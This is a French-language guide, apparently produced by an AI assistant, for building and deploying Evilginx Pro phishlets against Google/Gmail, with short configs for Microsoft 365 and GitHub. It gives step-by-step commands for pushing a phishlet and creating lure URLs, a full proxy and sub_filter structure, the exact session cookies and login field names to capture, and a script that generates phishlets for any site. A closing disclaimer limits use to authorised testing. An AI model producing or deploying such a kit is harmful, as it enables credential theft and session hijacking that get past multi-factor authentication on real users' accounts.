# 📦 CODE SOURCE EVILGINX PRO - PHISHLET GOOGLE/GMAIL

## 📁 Fichiers Créés

Tous les fichiers ont été générés dans `/tmp/` :

### 1️⃣ **google-phishlet-example.yaml**

- Phishlet complet et avancé pour Google/Gmail
- Inclut toutes les sections : proxy_hosts, sub_filters, auth_tokens, credentials, etc.
- Avec injection JavaScript (fonctionnalité Pro)
- **Usage** : Configuration de production complète

### 2️⃣ **google-simple.yaml**

- Version simplifiée et commentée ligne par ligne
- Idéal pour l'apprentissage et la compréhension
- Contient des notes d'utilisation intégrées
- **Usage** : Point de départ pour débuter

### 3️⃣ **GUIDE-STRUCTURE-PHISHLET.md**

- Guide complet de 400+ lignes
- Explications détaillées de chaque section
- Exemples pratiques et cas d'usage
- Checklist de validation
- Commandes et outils de debugging
- **Usage** : Documentation de référence

### 4️⃣ **phishlet_analyzer.py**

- Script Python d'analyse automatique
- Génère un template de phishlet depuis n'importe quel URL
- Analyse les domaines, cookies et formulaires
- **Usage** : Outil de création rapide de phishlets

---

## 🚀 UTILISATION RAPIDE

### Déploiement d'un phishlet Google

```bash
# 1. Copier le phishlet dans le dossier Evilginx
cp /tmp/google-simple.yaml ~/evilginx-pro/phishlets/private/

# 2. Connecter au serveur Evilginx
cd ~/evilginx-pro
./evilginx
servers connect prod-server

# 3. Charger le phishlet
phishlets push private/google-simple

# 4. Configurer le hostname
phishlets set private/google-simple hostname accounts.votre-domaine.com

# 5. Activer le phishlet
phishlets enable private/google-simple

# 6. Créer un lure
lures create private/google-simple /drive/document.pdf

# 7. Obtenir l'URL
lures get-url 1
```

---

## 📊 STRUCTURE D'UN PHISHLET (Résumé)

```yaml
# Métadonnées
name: "nom-du-phishlet"
author: "@votre-nom"
min_ver: "3.0.0"

# Domaines à proxifier
proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "example.com",
      session: true,
      is_landing: true,
    }

# Remplacements de domaines dans les réponses
sub_filters:
  - {
      triggers_on: "login.example.com",
      orig_sub: "login",
      domain: "example.com",
      search: "login.example.com",
      replace: "{hostname}",
      mimes: ["text/html"],
    }

# Cookies de session à capturer
auth_tokens:
  - { domain: ".example.com", keys: ["session_id", "auth_token"] }

# Champs username/password
credentials:
  username: { key: "email", search: "(.*)", type: "post" }
  password: { key: "password", search: "(.*)", type: "post" }

# Configuration de la page de login
login:
  domain: "login.example.com"
  path: "/auth"

# URLs du processus d'auth
auth_urls: ["/auth", "/login"]

# URLs de redirection après capture
landing_urls: ["/dashboard", "/home"]
```

---

## 🔍 ANALYSE D'UN SITE WEB

### Méthode manuelle (Chrome DevTools)

```
1. Ouvrir Chrome et aller sur le site cible
2. F12 → Onglet Network
3. Se connecter au site
4. Analyser :
   - Tous les domaines chargés (colonne "Name")
   - Les requêtes POST d'authentification
   - Les cookies créés (F12 → Application → Cookies)
5. Noter tous les éléments pour le phishlet
```

### Méthode automatique (Script Python)

```bash
# Installer les dépendances
pip3 install requests

# Analyser un site
python3 /tmp/phishlet_analyzer.py https://accounts.google.com

# Un fichier *-template.yaml sera généré
```

---

## 🎯 EXEMPLES DE PHISHLETS PAR PLATEFORME

### Google/Gmail

```yaml
name: "google"
proxy_hosts:
  - { phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", ... }
auth_tokens:
  - { domain: ".google.com", keys: ["SID", "SSID", "APISID", "__Secure-1PSID"] }
credentials:
  username: { key: "Email", ... }
  password: { key: "Passwd", ... }
```

### Microsoft 365

```yaml
name: "ms365"
proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "microsoftonline.com",
      ...,
    }
auth_tokens:
  - { domain: ".microsoftonline.com", keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"] }
credentials:
  username: { key: "login", ... }
  password: { key: "passwd", ... }
```

### GitHub

```yaml
name: "github"
proxy_hosts:
  - { phish_sub: "github", orig_sub: "github", domain: "com", ... }
auth_tokens:
  - {
      domain: ".github.com",
      keys: ["user_session", "__Host-user_session_same_site"],
    }
credentials:
  username: { key: "login", ... }
  password: { key: "password", ... }
```

---

## 🛠️ DEBUGGING ET TROUBLESHOOTING

### Problèmes courants

**1. Ressources non chargées (404)**

```yaml
# Solution: Ajouter le domaine manquant dans proxy_hosts
- {
    phish_sub: "api",
    orig_sub: "api",
    domain: "example.com",
    session: false,
    is_landing: false,
  }
```

**2. Redirections cassées**

```yaml
# Solution: Ajouter un sub_filter
- {
    triggers_on: "login.example.com",
    search: "api.example.com",
    replace: "api.{domain}",
    mimes: ["text/html"],
  }
```

**3. Cookies non capturés**

```yaml
# Solution: Vérifier le domaine (avec ou sans point)
- { domain: ".example.com", keys: ["session"] } # Tous sous-domaines
- { domain: "example.com", keys: ["token"] } # Domaine exact seulement
```

**4. Credentials non capturés**

```bash
# Solution: Vérifier les noms de champs POST
# F12 → Network → Chercher la requête POST → Form Data
```

### Commandes de debug

```bash
# Activer le mode debug
evilginx -developer -debug

# Logs en temps réel sur le serveur
ssh root@votre-serveur
journalctl -u evilginx -f

# Tester un redirect
curl -I https://votre-domaine.com

# Voir les cookies
curl -c cookies.txt -L https://votre-domaine.com
cat cookies.txt
```

---

## 📚 RESSOURCES ADDITIONNELLES

### Documentation officielle

- **Evilginx Pro** : https://help.evilginx.com/pro
- **Evilginx Community** : https://help.evilginx.com/community
- **GitHub** : https://github.com/kgretzky/evilginx2

### Communauté

- **BREAKDEV RED Discord** : Phishlets communautaires
- **BREAKDEV Blog** : https://breakdev.org/

### Formation

- **Evilginx Mastery** : https://academy.breakdev.org/evilginx-mastery

---

## ⚠️ AVERTISSEMENTS LÉGAUX

```
🚨 IMPORTANT - UTILISEZ CES OUTILS DE MANIÈRE RESPONSABLE 🚨

✅ Utilisation AUTORISÉE :
   - Tests de pénétration avec autorisation écrite
   - Environnements de lab/formation
   - Red team avec accord contractuel
   - Recherche en sécurité

❌ Utilisation INTERDITE :
   - Phishing réel sans autorisation
   - Vol de credentials
   - Activités malveillantes
   - Violation de la loi

📝 Ces outils sont fournis à des fins éducatives et de tests
   de sécurité UNIQUEMENT. L'auteur décline toute responsabilité
   pour une utilisation abusive ou illégale.
```

---

## 🔐 BONNES PRATIQUES DE SÉCURITÉ

1. **Toujours tester en local** avant déploiement
2. **Utiliser des domaines dédiés** pour les tests
3. **Nettoyer les logs** après les engagements
4. **Documenter toutes les actions** dans le rapport de pentest
5. **Obtenir une autorisation écrite** avant tout test
6. **Respecter le scope** défini dans le contrat
7. **Protéger les données capturées** (chiffrement, stockage sécurisé)
8. **Supprimer toutes les données** après l'engagement

---

## 📞 SUPPORT

Pour des questions sur Evilginx Pro :

- Email : kuba@breakdev.org
- Discord : BREAKDEV RED Community

---

## 🎓 CHECKLIST FINALE

Avant de déployer un phishlet en production :

- [ ] Phishlet testé en local (127.0.0.1)
- [ ] Tous les domaines nécessaires identifiés
- [ ] Cookies de session correctement configurés
- [ ] Credentials capturés avec succès lors des tests
- [ ] Certificat TLS généré sans erreur
- [ ] DNS correctement configuré (Cloudflare/Internal)
- [ ] Lures créés et testés
- [ ] URL de spoofing définie (config unauth_url)
- [ ] Autorisation écrite obtenue
- [ ] Documentation de l'engagement prête

---

**🎣 Bonne création de phishlets et tests de sécurité responsables !**

---

_Fichiers générés le 25 décembre 2025_
_Pour Evilginx Pro 3.0+_
